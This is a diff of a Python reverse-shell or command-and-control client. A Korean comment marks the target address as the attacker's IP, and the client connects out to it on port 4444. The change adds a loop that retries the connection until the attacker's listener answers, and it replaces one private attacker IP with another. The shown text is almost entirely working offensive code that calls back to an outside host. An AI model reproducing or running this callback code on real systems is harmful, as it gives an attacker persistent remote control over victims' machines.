@@ -7,8 +7,13 @@ import os
 def set_sock(ip, port):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    s.connect((ip, port))
-    return s
+    while True:
+        try:
+            s.connect((ip, port))
+        except ConnectionRefusedError:
+            continue
+        else:
+            return s
 
 
 def connect_cnc(s):
@@ -44,7 +49,7 @@ def connect_cnc(s):
 
 
 if __name__ == "__main__":
-    ip = "192.168.0.5"  # 연결할 공격자의 아이피 주소
+    ip = "192.168.219.102"  # 연결할 공격자의 아이피 주소
     port = 4444
     s = set_sock(ip, port)
     connect_cnc(s)
